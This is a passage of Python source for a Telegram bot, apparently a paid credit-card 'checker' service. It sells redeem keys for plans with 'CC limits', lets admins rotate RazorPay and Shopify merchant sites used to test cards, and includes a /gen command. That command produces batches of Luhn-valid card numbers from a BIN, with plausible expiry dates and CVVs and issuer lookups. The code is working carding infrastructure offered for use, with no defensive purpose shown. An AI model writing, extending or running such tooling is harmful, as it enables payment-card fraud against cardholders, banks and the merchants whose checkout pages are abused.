        return await styled_reply(event, f"{PE} <code>/genkey plan days [limit]</code>\n{PE} <i>{bs('Plans')}: Core, Elite, Root, X</i>", emoji_ids=[CE["warn"]])
    try:
        plan = parts[1].title()
        days = int(parts[2])
        limit = None
        if len(parts) >= 4:
            limit = int(parts[3])
    except:
        return await styled_reply(event, f"{PE} <b>{bs('Invalid arguments')}</b>\n{PE} <code>/genkey plan days [limit]</code>", emoji_ids=[CE["cross"]])
    
    if plan.upper() not in [p.upper() for p in PAID_TIERS]:
        return await styled_reply(event, f"{PE} <b>{bs('Invalid plan')}</b>\n{PE} <i>{bs('Plans')}: Core, Elite, Root, X</i>", emoji_ids=[CE["cross"]])
        
    plan = next(p for p in PAID_TIERS if p.upper() == plan.upper())
    
    if limit is None:
        limit = await get_cc_limit(plan)
        
    code = f"CC-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}"
    
    await create_redeem_key(code, plan, days, limit)
    
    redeem_msg = f"""🔑 <b>{bs('Redeem Code Generated')}</b> 🔑
<b>━━━━━━━━━━━━━━━━━</b>
🏷️ <b>{bs('Plan')}</b> ↬ <b>{plan.upper()}</b>
⏱️ <b>{bs('Duration')}</b> ↬ <code>{days} {bs('Days')}</code>
🚀 <b>{bs('CC Limit')}</b> ↬ <code>{limit} CCs</code>
<b>━━━━━━━━━━━━━━━━━</b>
📱 <b>{bs('How to Claim')}:</b>
⤷ <i>{bs('Copy the code below and send')}</i>
<code>/redeem {code}</code>

🔑 <b>{bs('Redeem Code')}:</b>
<code>{code}</code>"""
    await styled_reply(event, redeem_msg, emoji_ids=[CE["crown"], CE["star"], CE["check"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]redeem\b'))
async def redeem_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
        
    parts = event.raw_text.split()
    if len(parts) < 2:
        return await styled_reply(event, f"{PE} <code>/redeem CC-XXXX-XXXX-XXXX</code>", emoji_ids=[CE["warn"]])
        
    code = parts[1].strip()
    success, res = await redeem_key(code, event.sender_id)
    if not success:
        return await styled_reply(event, f"❌ <b>{bs('Redemption Failed')}</b>\n⤷ <code>{res}</code>", emoji_ids=[CE["cross"]])
        
    plan = res["plan"]
    days = res["days"]
    limit = res["limit"]
    expiry_date = res["expiry"].strftime('%Y-%m-%d %H:%M:%S')
    
    try:
        sender = await event.get_sender()
        name = getattr(sender, 'first_name', None) or sender.username or "User"
    except:
        name = "User"
        
    await styled_reply(event, f"""🎉 <b>{bs('Redeemed Successfully!')}</b> 🎉
<b>━━━━━━━━━━━━━━━━━</b>
👤 <b>{bs('User')}</b> ↬ <a href="tg://user?id={event.sender_id}">{name}</a>
🏷️ <b>{bs('Plan')}</b> ↬ <b>{plan.upper()}</b>
⏱️ <b>{bs('Duration')}</b> ↬ <code>{days} {bs('Days')}</code>
🚀 <b>{bs('CC Limit')}</b> ↬ <code>{limit} CCs</code>
📅 <b>{bs('Expires')}</b> ↬ <code>{expiry_date}</code>
<b>━━━━━━━━━━━━━━━━━</b>
✨ <i>{bs('Thank you for choosing PrimeTheOfficialNew Chk!')}</i>""", emoji_ids=[CE["party"], CE["party"], CE["check"]])
    
    try:
        await styled_send(LOG_CHANNEL_ID, f"🔑 <b>{bs('Key Redeemed')}</b>\n👤 <a href='tg://user?id={event.sender_id}'>{name}</a> (<code>{event.sender_id}</code>) ━ <b>{plan.upper()}</b> ━ <code>{days}d</code> ━ <code>{code}</code>")
    except: pass

# ====================== ADMIN BROADCAST ======================
PENDING_BROADCASTS = {}
ACTIVE_BROADCAST = {"running": False}

@client.on(events.NewMessage(pattern=r'(?i)^[/.](broadcast|bc)\b'))
async def broadcast_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return
    
    reply_msg = await event.get_reply_message()
    if reply_msg:
        msg_to_broadcast = reply_msg
    else:
        text = re.sub(r'(?i)^[/.](broadcast|bc)\s*', '', event.raw_text).strip()
        if not text:
            return await styled_reply(event, f"⚠️ <b>{bs('Usage')}:</b>\n⤷ <code>/broadcast message</code>\n⤷ <i>Or reply to any message with </i><code>/broadcast</code>")
        msg_to_broadcast = text
        
    admin_id = event.sender_id
    PENDING_BROADCASTS[admin_id] = msg_to_broadcast
    
    preview_text = f"⚙️ <b>{bs('BROADCAST PREVIEW')}</b>\n<b>━━━━━━━━━━━━━━━━━</b>\n"
    await styled_reply(event, preview_text)
    
    buttons = [
        [pbtn(bs("Confirm Broadcast"), f"bc_confirm:{admin_id}", bg_success=True, icon=CE["check"]),
         pbtn(bs("Cancel"), f"bc_cancel:{admin_id}", bg_danger=True, icon=CE["cross"])]
    ]
    
    if isinstance(msg_to_broadcast, str):
        await client.send_message(admin_id, msg_to_broadcast, buttons=buttons)
    else:
        await client.send_message(admin_id, msg_to_broadcast, buttons=buttons)

@client.on(events.CallbackQuery(pattern=rb"bc_confirm:(\d+)"))
async def bc_confirm_cb(event):
    admin_id = int(event.pattern_match.group(1).decode())
    if event.sender_id != admin_id:
        return await event.answer("Not yours!", alert=True)
    
    msg_to_broadcast = PENDING_BROADCASTS.pop(admin_id, None)
    if not msg_to_broadcast:
        return await event.answer("No pending broadcast found.", alert=True)
    
    if ACTIVE_BROADCAST["running"]:
        return await event.answer("Another broadcast is currently running.", alert=True)
    
    await event.answer("Starting broadcast...")
    await event.delete()
    
    ACTIVE_BROADCAST["running"] = True
    asyncio.create_task(_run_broadcast(event.chat_id, msg_to_broadcast))

@client.on(events.CallbackQuery(pattern=rb"bc_cancel:(\d+)"))
async def bc_cancel_cb(event):
    admin_id = int(event.pattern_match.group(1).decode())
    if event.sender_id != admin_id:
        return await event.answer("Not yours!", alert=True)
    
    PENDING_BROADCASTS.pop(admin_id, None)
    await event.answer("Broadcast cancelled.", alert=True)
    await event.delete()

async def _run_broadcast(admin_chat_id, msg_to_broadcast):
    try:
        cursor = db["users"].find({}, {"user_id": 1})
        users = await cursor.to_list(length=100000)
        user_ids = list({u["user_id"] for u in users if "user_id" in u})
        
        total = len(user_ids)
        if total == 0:
            await client.send_message(admin_chat_id, f"⚠️ <b>{bs('No users found in database!')}</b>")
            ACTIVE_BROADCAST["running"] = False
            return
        
        progress_msg = await client.send_message(
            admin_chat_id,
            f"📢 <b>{bs('Broadcast Started')}</b>\n<b>━━━━━━━━━━━━━━━━━</b>\n👥 <b>{bs('Total Users')}:</b> <code>{total}</code>\n⏳ <b>{bs('Progress')}:</b> <code>0%</code>\n✅ <b>{bs('Success')}:</b> <code>0</code>\n❌ <b>{bs('Failed')}:</b> <code>0</code>"
        )
        
        success = 0
        failed = 0
        start_time = time.time()
        last_update = time.time()
        
        for idx, uid in enumerate(user_ids, 1):
            try:
                if isinstance(msg_to_broadcast, str):
                    await client.send_message(uid, msg_to_broadcast)
                else:
                    await client.send_message(uid, msg_to_broadcast)
                success += 1
            except FloodWaitError as e:
                log_system("BROADCAST_FLOOD", f"Sleeping for {e.seconds}s during broadcast")
                await asyncio.sleep(e.seconds)
                try:
                    if isinstance(msg_to_broadcast, str):
                        await client.send_message(uid, msg_to_broadcast)
                    else:
                        await client.send_message(uid, msg_to_broadcast)
                    success += 1
                except:
                    failed += 1
            except Exception:
                failed += 1
            
            await asyncio.sleep(0.1)
            
            now = time.time()
            if now - last_update > 4.0 or idx == total:
                pct = (idx / total) * 100
                progress_text = (
                    f"📢 <b>{bs('Broadcast Progress')}</b>\n"
                    f"<b>━━━━━━━━━━━━━━━━━</b>\n"
                    f"👥 <b>{bs('Total Users')}:</b> <code>{total}</code>\n"
                    f"⏳ <b>{bs('Progress')}:</b> <code>{idx}/{total} ({pct:.1f}%)</code>\n"
                    f"✅ <b>{bs('Success')}:</b> <code>{success}</code>\n"
                    f"❌ <b>{bs('Failed')}:</b> <code>{failed}</code>"
                )
                try:
                    await progress_msg.edit(progress_text)
                except:
                    pass
                last_update = now
        
        elapsed = int(time.time() - start_time)
        h, remainder = divmod(elapsed, 3600)
        m, s = divmod(remainder, 60)
        time_str = f"{h}h {m}m {s}s" if h > 0 else (f"{m}m {s}s" if m > 0 else f"{s}s")
        
        final_text = (
            f"🎉 <b>{bs('Broadcast Completed')}</b>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>\n"
            f"👥 <b>{bs('Total Users')}:</b> <code>{total}</code>\n"
            f"✅ <b>{bs('Success')}:</b> <code>{success}</code>\n"
            f"❌ <b>{bs('Failed')}:</b> <code>{failed}</code>\n"
            f"⏱️ <b>{bs('Time Taken')}:</b> <code>{time_str}</code>"
        )
        await progress_msg.edit(final_text)
    except Exception as e:
        await client.send_message(admin_chat_id, f"❌ <b>{bs('Broadcast Error')}:</b> <code>{e}</code>")
    finally:
        ACTIVE_BROADCAST["running"] = False

# ====================== GATEWAY TOGGLE & FILE RETRIEVAL ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.](disable|enable)\s+(razorpay|shopify|rz|sp)\b'))
async def toggle_gateway(event):
    if event.sender_id not in ADMIN_ID:
        return
    
    parts = event.raw_text.split()
    cmd = parts[0][1:].lower()
    gw = parts[1].lower()
    
    if gw in ["razorpay", "rz"]:
        target_gw = "razorpay"
        disp_name = "RazorPay"
    elif gw in ["shopify", "sp"]:
        target_gw = "shopify"
        disp_name = "Shopify"
    else:
        return await styled_reply(event, f"⚠️ <b>{bs('Invalid gateway')}</b>\n⤷ <i>{bs('Choose razorpay or shopify')}</i>", emoji_ids=[CE["warn"]])
    
    disabled_status = (cmd == "disable")
    await set_gateway_status(target_gw, disabled_status)
    
    status_str = bs("Disabled") if disabled_status else bs("Enabled")
    emoji = CE["stop"] if disabled_status else CE["check"]
    
    await styled_reply(event, f"⚙️ <b>{bs('Gateway Status Updated')}</b>\n<b>━━━━━━━━━━━━━━━━━</b>\n⤷ {disp_name} ━ <b>{status_str}</b>", emoji_ids=[emoji])

@client.on(events.CallbackQuery(pattern=rb"getfile:(-?\d+):(\d+)"))
async def get_file_cb(event):
    if event.sender_id not in ADMIN_ID:
        return await event.answer("Access Denied!", alert=True)
    
    chat_id = int(event.pattern_match.group(1).decode())
    msg_id = int(event.pattern_match.group(2).decode())
    
    await event.answer("Fetching file...")
    try:
        msg = await client.get_messages(chat_id, ids=msg_id)
        if msg and msg.media:
            await client.send_message(event.sender_id, f"📄 <b>{bs('Requested File')}</b>", file=msg.media)
        else:
            await event.answer("File no longer available or not found.", alert=True)
    except Exception as e:
        await client.send_message(event.sender_id, f"❌ <b>{bs('Error fetching file')}:</b> <code>{e}</code>")

# ====================== ADMIN HELP PANEL ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]admin$'))
async def admin_help_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    text = f"""{PE} <b><i>{bs('Admin Panel')}</i></b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b><i>{bs('User Control')}</i></b>
|   {PE} <code>/approve user_id plan days</code>
|   {PE} <code>/ban user_id</code>
|   {PE} <code>/unban user_id</code>
|   {PE} <code>/setlimit user_id limit</code>
|   {PE} <code>/mrzlimit user_id limit</code> ━ <b>{bs('Set MRZ limit')}</b>
|   {PE} <code>/sp user_id limit</code> ━ <b>{bs('Set SP limit')}</b>
|   {PE} <code>/user user_id</code>
|   {PE} <code>/users</code> ━ <b>{bs('All users file')}</b>
|   {PE} <code>/broadcast</code> ━ <b>{bs('Broadcast to all')}</b>

{PE} <b><i>{bs('RazorPay Control')}</i></b>
|   {PE} <code>/addrz sites</code> ━ <b>{bs('Add RazorPay sites')}</b>
|   {PE} <code>/rmrz site</code> ━ <b>{bs('Remove RazorPay sites')}</b>
|   {PE} <code>/changerz site</code> ━ <b>{bs('Set active site')}</b>
|   {PE} <code>/viewrz</code> ━ <b>{bs('View rotation sites')}</b>
|   {PE} <code>/editrz amount</code> ━ <b>{bs('Set check amount')}</b>
|   {PE} <code>/getrz</code> ━ <b>{bs('Get all sites file')}</b>
|   {PE} <code>/mrzspeed slow/original</code> ━ <b>{bs('Toggle speed')}</b>

{PE} <b><i>{bs('Plan Control')}</i></b>
|   {PE} <code>/plan1-4 user_id</code> ━ <b>{bs('Assign access')}</b>
|   {PE} <code>/rplan user_id</code> ━ <b>{bs('Revoke access')}</b>
|   {PE} <code>/planall</code> ━ <b>{bs('Premium users file')}</b>
|   {PE} <code>/genkey plan days [limit]</code>

{PE} <b><i>{bs('System & Owner Control')}</i></b>
|   {PE} <code>/changeowner @username</code> ━ <b>{bs('Set owner user')}</b>
|   {PE} <code>/status</code> ━ <b>{bs('System health')}</b>
|   {PE} <code>/stats</code> ━ <b>{bs('Database stats')}</b>
|   {PE} <code>/maintenance on/off</code>
|   {PE} <code>/disable gateway</code> ━ <b>{bs('Disable gateway')}</b>
|   {PE} <code>/enable gateway</code> ━ <b>{bs('Enable gateway')}</b>
|   {PE} <code>/addg site.com</code> ━ <b>{bs('Add global site')}</b>
|   {PE} <code>/rmg site.com</code> ━ <b>{bs('Remove global site')}</b>
|   {PE} <code>/sitesg</code> ━ <b>{bs('View global sites')}</b>
<b>━━━━━━━━━━━━━━━━━</b>"""
    ei = [
        CE["crown"], CE["crown"],
        CE["star"],
        CE["check"], CE["stop"], CE["check"], CE["warn"], CE["warn"], CE["warn"], CE["info"], CE["eyes"], CE["joker"],
        CE["star"],
        CE["plus"], CE["cross"], CE["restart"], CE["eyes"], CE["pin"], CE["eyes"], CE["bolt"],
        CE["brain"],
        CE["plus"], CE["cross"], CE["globe"], CE["link"],
        CE["shield"],
        CE["crown"], CE["online"], CE["chart"], CE["stop"], CE["stop"], CE["check"], CE["plus"], CE["cross"], CE["globe"]
    ]
    await styled_reply(event, text, emoji_ids=ei)

# ====================== GLOBAL PUBLIC SITES ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]addg\b'))
async def add_global_site_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    sta = []
    if event.is_reply:
        rm = await event.get_reply_message()
        if rm and rm.file:
            fp = await rm.download_media()
            try:
                async with aiofiles.open(fp, "r", encoding="utf-8", errors="ignore") as f:
                    sta = extract_urls_from_text(await f.read())
            finally:
                try: os.remove(fp)
                except: pass
        elif rm and rm.text:
            sta = extract_urls_from_text(rm.text)
            
    add_text = re.sub(r'^[/.]addg\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
    if add_text:
        for s in extract_urls_from_text(add_text):
            if s not in sta:
                sta.append(s)
                
    if not sta:
        return await styled_reply(event, f"{PE} <code>/addg site.com</code> {bs('or reply to a .txt file')}", emoji_ids=[CE["info"]])
        
    added = 0
    for u in sta:
        n = normalize_site_url(u)
        if await add_global_site(n):
            added += 1
            
    await styled_reply(event, f"{PE} <b>{bs('Added')} {added}/{len(sta)} {bs('to global sites')}</b>", emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rmg\b'))
async def remove_global_site_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    sta = []
    if event.is_reply:
        rm = await event.get_reply_message()
        if rm and rm.file:
            fp = await rm.download_media()
            try:
                async with aiofiles.open(fp, "r", encoding="utf-8", errors="ignore") as f:
                    sta = extract_urls_from_text(await f.read())
            finally:
                try: os.remove(fp)
                except: pass
        elif rm and rm.text:
            sta = extract_urls_from_text(rm.text)
            
    rm_text = re.sub(r'^[/.]rmg\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
    if rm_text:
        for s in extract_urls_from_text(rm_text):
            if s not in sta:
                sta.append(s)
                
    if not sta:
        return await styled_reply(event, f"{PE} <code>/rmg site.com</code> {bs('or reply to a .txt file')}", emoji_ids=[CE["info"]])
        
    removed = 0
    for u in sta:
        n = normalize_site_url(u)
        if await remove_global_site(n):
            removed += 1
            
    await styled_reply(event, f"{PE} <b>{bs('Removed')} {removed}/{len(sta)} {bs('from global sites')}</b>", emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]sitesg$'))
async def list_global_sites_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    sites = await get_global_sites()
    if not sites: return await styled_reply(event, f"{PE} <b>{bs('No global sites')}</b>", emoji_ids=[CE["warn"]])
    text = f"{PE} <b>{bs('Global Sites')}</b> ({len(sites)}) {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n"
    eid = [CE["fire"], CE["fire"]]
    for i, s in enumerate(sites[:50], 1): text += f"{PE} <code>{i}.</code> <b>{s}</b>\n"; eid.append(CE["link"])
    if len(sites) > 50: text += f"\n<i>+{len(sites)-50} more</i>"
    await styled_reply(event, text, emoji_ids=eid)

# ====================== CARD GENERATOR ======================
def parse_gen_input(text):
    args = re.sub(r'(?i)^[/.]gen\s*', '', text).strip()
    if not args:
        return None, None, None, None, 10

    words = args.split()
    amount = 10
    card_part = args

    if len(words) >= 2:
        last_word = words[-1]
        if last_word.isdigit():
            val = int(last_word)
            remaining_text = " ".join(words[:-1])
            remaining_tokens = [t.strip() for t in re.split(r'[|/\\:\-\s]+', remaining_text) if t.strip()]
            if remaining_tokens:
                is_amount = False
                if len(remaining_tokens) >= 3:
                    if val <= 50:
                        is_amount = True
                    elif len(remaining_tokens) >= 4:
                        is_amount = True
                else:
                    if val <= 50:
                        is_amount = True
                if is_amount:
                    amount = val
                    card_part = remaining_text

    tokens = [t.strip() for t in re.split(r'[|/\\:\-]+', card_part) if t.strip()]
    if len(tokens) == 1 and " " in tokens[0]:
        tokens = [t.strip() for t in tokens[0].split() if t.strip()]

    bin_val = tokens[0] if len(tokens) >= 1 else None
    month_val = tokens[1] if len(tokens) >= 2 and tokens[1] != "" else None
    year_val = tokens[2] if len(tokens) >= 3 and tokens[2] != "" else None
    cvv_val = tokens[3] if len(tokens) >= 4 and tokens[3] != "" else None

    if bin_val:
        bin_val = "".join(c for c in bin_val if c.isdigit() or c.lower() == 'x')
    if month_val:
        month_val = "".join(c for c in month_val if c.isdigit() or c.lower() == 'x')
    if year_val:
        year_val = "".join(c for c in year_val if c.isdigit() or c.lower() == 'x')
    if cvv_val:
        cvv_val = "".join(c for c in cvv_val if c.isdigit() or c.lower() == 'x')

    return bin_val, month_val, year_val, cvv_val, amount

def generate_cc(bin_val, month_val=None, year_val=None, cvv_val=None):
    if not bin_val:
        return ""
    if bin_val.startswith(('34', '37')):
        length = 15
        cvv_len = 4
    else:
        length = 16
        cvv_len = 3

    pan_draft = []
    prefix = bin_val[:length - 1]
    for i in range(length - 1):
        if i < len(prefix):
            char = prefix[i]
            if char.lower() == 'x':
                pan_draft.append(str(random.randint(0, 9)))
            else:
                pan_draft.append(char)
        else:
            pan_draft.append(str(random.randint(0, 9)))

    draft_str = "".join(pan_draft)
    total_sum = 0
    for idx, digit_char in enumerate(reversed(draft_str)):
        digit = int(digit_char)
        if idx % 2 == 0:
            digit *= 2
            if digit > 9:
                digit -= 9
        total_sum += digit

    check_digit = (10 - (total_sum % 10)) % 10
    cc_number = draft_str + str(check_digit)

    if not month_val or month_val.lower() in ('xx', 'x'):
        month = f"{random.randint(1, 12):02d}"
    else:
        m_chars = []
        for idx, char in enumerate(month_val[:2]):
            if char.lower() == 'x':
                if idx == 0:
                    m_chars.append(str(random.randint(0, 1)))
                else:
                    m_chars.append(str(random.randint(0, 9)))
            else:
                m_chars.append(char)
        month = "".join(m_chars)
        try:
            m_int = int(month)
            if not (1 <= m_int <= 12):
                month = f"{random.randint(1, 12):02d}"
        except:
            month = f"{random.randint(1, 12):02d}"

    if not year_val or year_val.lower() in ('xx', 'xxxx', 'x'):
        year = str(random.randint(26, 31))
    else:
        y_chars = []
        for char in year_val:
            if char.lower() == 'x':
                y_chars.append(str(random.randint(0, 9)))
            else:
                y_chars.append(char)
        year = "".join(y_chars)
        
    # Fix: ensure year is not expired
    try:
        y_int = int(year)
        current_year = datetime.now().year % 100
        if y_int < current_year:
            year = str(random.randint(current_year, current_year + 5))
    except:
        year = str(random.randint(26, 31))

    if not cvv_val or cvv_val.lower() in ('xxx', 'xxxx', 'x'):
        cvv = "".join(str(random.randint(0, 9)) for _ in range(cvv_len))
    else:
        c_chars = []
        for char in cvv_val[:cvv_len]:
            if char.lower() == 'x':
                c_chars.append(str(random.randint(0, 9)))
            else:
                c_chars.append(char)
        while len(c_chars) < cvv_len:
            c_chars.append(str(random.randint(0, 9)))
        cvv = "".join(c_chars)

    return f"{cc_number}|{month}|{year}|{cvv}"

@client.on(events.NewMessage(pattern=r'(?i)^[/.]gen\b'))
async def gen_cc_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned": t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)

    bin_val, month_val, year_val, cvv_val, amount = parse_gen_input(event.raw_text)
    if not bin_val or not any(c.isdigit() for c in bin_val):
        return await styled_reply(event, f"{PE} <b>{bs('Invalid BIN!')}</b>\n<b>{bs('Usage')}:</b> <code>/gen BIN [Amount]</code>", emoji_ids=[CE["warn"]])

    amount = min(max(1, amount), 30)

    cards = []
    for _ in range(amount):
        cc = generate_cc(bin_val, month_val, year_val, cvv_val)
        if cc:
            cards.append(cc)

    if not cards:
        return await styled_reply(event, f"{PE} <b>{bs('Failed to generate cards!')}</b>", emoji_ids=[CE["warn"]])

    first_card = cards[0]
    bin_prefix = first_card.split('|')[0][:6]
    
    lm = await styled_reply(event, f"{bs('Generating')}… ⏳")
    try:
        bi = await get_bin_info(bin_prefix)
    except:
        bi = {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}

    info_str = f"{bi.get('brand', '-') or '-'} - {bi.get('type', '-') or '-'} - {bi.get('level', '-') or '-'}".upper()
    issuer_str = (bi.get('bank', '-') or '-').upper()
    country_str = f"{bi.get('country', '-') or '-'} {bi.get('flag', '') or ''}".upper().strip()

    cards_text = "\n".join(f"<code>{card}</code>" for card in cards)

    text = f"""{PE} <b>𝗕𝗜𝗡 ⇾</b> {bin_val}
{PE} <b>𝗔𝗺𝗼𝘂𝗻𝘁 ⇾</b> {amount}

{cards_text}

{PE} <b>𝗜𝗻𝗳𝗼:</b> {info_str}
{PE} <b>𝐈𝐬𝐬𝐮𝐞𝐫:</b> {issuer_str}
{PE} <b>🇨🇺 Country:</b> {country_str}"""

    try:
        await lm.delete()
    except:
        pass

    emoji_ids = [CE["fire"], CE["bolt"], CE["info"], CE["shield"], CE["globe"]]
    await styled_reply(event, text, emoji_ids=emoji_ids)

# ====================== MAIN ======================
async def main():
    global client_instance
    client_instance = client
    await init_db()
    global OWNER_USERNAME
    try:
        doc = await db["settings"].find_one({"key": "owner_username"})
        if doc and doc.get("username"):
            OWNER_USERNAME = doc.get("username")
    except:
        pass
    while True:
        try:
            log_system("BOOT", "Starting bot...")
            await client.start(bot_token=BOT_TOKEN)
            log_system("BOOT", "✅ Bot Started!")
            await client.run_until_disconnected()
        except FloodWaitError as e:
            log_system("FLOOD", f"Sleeping {e.seconds+5}s", "warning")
            await asyncio.sleep(e.seconds + 5)
        except Exception as e:
            log_system("CRASH", f"{e}", "error")
            await asyncio.sleep(10)

if __name__ == "__main__":
    asyncio.run(main())
